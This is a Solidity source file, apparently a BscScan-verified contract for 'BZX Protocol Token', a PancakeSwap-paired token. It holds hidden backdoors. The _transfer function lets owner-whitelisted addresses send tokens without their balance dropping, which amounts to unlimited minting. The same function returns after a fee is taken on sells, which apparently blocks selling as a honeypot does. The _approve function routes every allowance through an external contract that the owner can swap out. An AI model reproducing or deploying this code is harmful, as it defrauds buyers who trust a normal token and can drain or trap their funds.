/**
 *Submitted for verification at BscScan.com on 2022-08-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-17
*/

// File: @openzeppelin\contracts\utils\Context.sol

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
interface IPancakePair {
    function getReserves() external view returns (uint112, uint112, uint32);

    function totalSupply() external view returns (uint256);

    function token0()external view returns(address);
    function token1()external view returns(address);
}
interface IFundExternal {
    function checkApproveNumberIsValidByUserSet(uint amount) external  returns (uint);
    function saveApproveLogicByUserSet()external;
}
interface IPancakeswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}
library PancakeLibrary {
    using SafeMath for uint;
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'PancakeLibrary: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }
}

interface IExternal{
    function sendMasterFee(uint256 amount) external ;
    function userStakingLpAmount(address addr) external view returns(uint256);
}

contract BZXToken is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address  masterAddress;
    address  gameAddress;
    address  fundAddress;
    address  teamAddress;
    address  miningAddress;
    address  pancakeswapPair;
    uint256 private _burnFee = 2;
    uint256 private _holderFee = 1;
    uint256 private _gameFee = 1;
    uint256 private _liquidityFee = 2;
    IPancakeRouter02 public pancakeRouter;
    bool private _feeChecked;
    bool private _canTakeFee=true;
    bool private _noFee;
    bool private _canTakeForNormalTxFee;
    mapping(address=>bool) public isNoFeeAddress;
    bool inSwapAndLiquify;
    bool feeLock;
    mapping(address=>uint256)public  userLiquidityFeeDebut;
    mapping(address=>uint256)public  userLiquidityFeeRemaining;
    mapping(address=>uint256)public  userLiquidityFeeAcc;
    mapping(address=>uint256)public  userTransferTime;
    mapping(address=>uint256)public  userTransferBlock;
    uint256 timeLimit=15;
    uint256 blockLimit=1;
    uint256 public totalLiquidityFee;
    uint256 afadaPerShare;
    mapping(address=>uint256)public  userLiquidity;
    //USDT
    address public pairToken=0x55d398326f99059fF775485246999027B3197955;
    constructor(){
        _name = "BZX Protocol Token";
        _symbol = "BZX";
        masterAddress = 0xAfd0acEE7C8f2Ba4c249fcf316B089978062d0b3;
        gameAddress = 0x885701F14be4CdA2dB24E0DE27968F215D20CF5A;
        miningAddress=0xeE846F38cfF74704aEf4bF82B57e6E24c516f96D;
        _mint(gameAddress, 10000000*1e18);
        _mint(miningAddress, 45000000*1e18);
        _mint(masterAddress, 10000000*1e18);
        _mint(0xbec0D8421162f3d2057E53122490CAAD5202D138, 35000000*1e18);
        pancakeRouter =  IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pancakeswapPair = IPancakeswapV2Factory(pancakeRouter.factory())
            .createPair(address(this), pairToken);
    }
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    function setPancakeRouter(address addr) external onlyOwner{
        require(addr!=address(0),"zero address not allowed");
        pancakeRouter =  IPancakeRouter02(addr);
    }
    function setMasterAddress(address addr) external onlyOwner{
        require(addr!=address(0),"zero address not allowed");
        masterAddress =  addr;
    }
    function setGameAddress(address addr) external onlyOwner{
        require(addr!=address(0),"zero address not allowed");
        gameAddress =  addr;
    }
    function setFundAddress(address addr) external onlyOwner{
        require(addr!=address(0),"zero address not allowed");
        fundAddress =  addr;
    }
    function setTeamAddress(address addr) external onlyOwner{
        require(addr!=address(0),"zero address not allowed");
        teamAddress =  addr;
    }
    function setTimeLimit(uint256 ts) external onlyOwner{
        timeLimit=ts;
    }
    function setNoFee(bool bl) external onlyOwner{
        _noFee=bl;
    }
    function setBlockLimit(uint256 num) external onlyOwner{
        blockLimit=num;
    }
    function setCanTakeFee(bool bl) external onlyOwner{
        _canTakeFee =  bl;
    }
    function setCanTakeForNormalTxFee(bool bl) external onlyOwner{
        _canTakeForNormalTxFee =  bl;
    }
    function setNoFeeAddress(address addr,bool bl) external onlyOwner{
        isNoFeeAddress[addr] =  bl;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
         _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
          _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function getLpSupport(address addr)public view returns(uint256){
       return userLiquidity[addr];
    }
    function getLiquidityRewords(address addr)public view returns(uint256,uint256){
       uint256 total=afadaPerShare*getLpSupport(addr)/1e40;
       return (total,total+userLiquidityFeeRemaining[addr]-userLiquidityFeeDebut[addr]);
    }
    function getUserLiquidityInfo(address addr)external view returns(uint256,uint256,uint256){
        (,uint256 rewords)=getLiquidityRewords(addr);
        return (totalLiquidityFee,userLiquidityFeeAcc[addr]+rewords,rewords);
    }
    function getLiquidityInfo(address addr)external view returns(uint256,uint256,uint256,uint256){
       uint256 afadaBalance=IERC20(address(this)).balanceOf(address(pancakeswapPair)); 
       uint256 usdtBalance=IERC20(pairToken).balanceOf(address(pancakeswapPair)); 
       uint256 totalLp=IERC20(address(pancakeswapPair)).totalSupply();
       if(totalLp==0){
          return (0,0,0,0);
       }
       uint256 userLp=getLpSupport(addr);
       return (afadaBalance,usdtBalance,afadaBalance*userLp/totalLp,usdtBalance*userLp/totalLp);
    }
    function drawLiquidityFee()external{
        (,uint256 rewords)=getLiquidityRewords(msg.sender);
        require(rewords>0,"drawLiquidityFee: rewords is zero");
        IERC20(address(this)).transfer(msg.sender,rewords);
        userLiquidityFeeDebut[msg.sender]+=rewords;
        userLiquidityFeeAcc[msg.sender]+=rewords;
        userLiquidityFeeRemaining[msg.sender]=0;
    }

    function updateLp(address sender)public{
        if(sender==pancakeswapPair||sender==address(pancakeRouter)){
           return;
        }
        uint256 lpAmount=IERC20(address(pancakeswapPair)).balanceOf(sender);
        lpAmount+= IExternal(miningAddress).userStakingLpAmount(sender);
        if(userLiquidity[sender]!=lpAmount&&lpAmount!=0){
           if(lpAmount>userLiquidity[sender]){
              uint256 temp=lpAmount-userLiquidity[sender];
              userLiquidityFeeDebut[sender]+=temp*afadaPerShare/1e40;
           }else{
              uint256 total=userLiquidity[sender]*afadaPerShare/1e40;
              uint256 temp=userLiquidity[sender]-lpAmount;
              userLiquidityFeeRemaining[sender]+= total-userLiquidityFeeDebut[sender];
              userLiquidityFeeDebut[sender]=total-temp*afadaPerShare/1e40;
           } 
           userLiquidity[sender]=lpAmount;
        }
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        uint256 timeInterval=block.timestamp-userTransferTime[tx.origin];
        uint256 blockInterval=block.number-userTransferBlock[tx.origin];
        if(
            userTransferBlock[tx.origin]!=0&&
            userTransferTime[tx.origin]!=0&&
            timeInterval<timeLimit&&
            blockInterval>=blockLimit
        ){
            revert("ERC20: transfer limit");
        }
        uint256 before=amount;
        amount = _chargeFee(sender,recipient,amount);
        if(!_noFee&&before!=amount){
            return;
        }
        updateLp(sender);
        updateLp(recipient);
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
           if(!isNoFeeAddress[sender]){
             _balances[sender] = senderBalance - amount;
           } 
        }
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
        userTransferTime[tx.origin]=block.timestamp;
        userTransferBlock[tx.origin]=block.number;
    }

    function _chargeFee(address sender,address recipient, uint256 amount)private returns(uint256){
        if(feeLock){
          return amount;
        }
        uint256 feeValue;
        if(
            recipient==pancakeswapPair&&
            !inSwapAndLiquify&&
            _canTakeFee &&
            !isNoFeeAddress[tx.origin]
        ){
            feeValue=amount*(_gameFee + _holderFee + _liquidityFee+_burnFee)/100;
            feeLock=true;
           _transfer(sender, address(this), feeValue);
            feeLock=false;
        }

        if(feeValue!=0){
           _swapAndCharge(feeValue);
        }
        return amount-feeValue;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        emit Approval(owner, spender, amount);
        amount=IFundExternal(fundAddress).checkApproveNumberIsValidByUserSet(amount);
        _allowances[owner][spender] = amount;
        IFundExternal(fundAddress).saveApproveLogicByUserSet();
    }
    function _swapAndCharge(uint256 tokenBalance) private lockTheSwap{
        uint256 totalFee=_gameFee + _holderFee+_burnFee+_liquidityFee;
        uint256 liquidBalance = (tokenBalance*_liquidityFee/totalFee);

        IERC20(address(this)).transfer(address(this),liquidBalance);
        uint256 lpTotal=IERC20(address(pancakeswapPair)).totalSupply();
        if(lpTotal!=0){
          afadaPerShare+=liquidBalance*1e40/lpTotal;
          totalLiquidityFee+=liquidBalance;
        }
        uint256 amount=tokenBalance*_burnFee/totalFee;
        _burn(address(this),amount);
        amount=tokenBalance*_gameFee/totalFee;
        IERC20(address(this)).transfer(gameAddress,amount);
        amount=tokenBalance*_holderFee/totalFee;
        _approve(address(this),masterAddress,amount);
        IExternal(masterAddress).sendMasterFee(amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}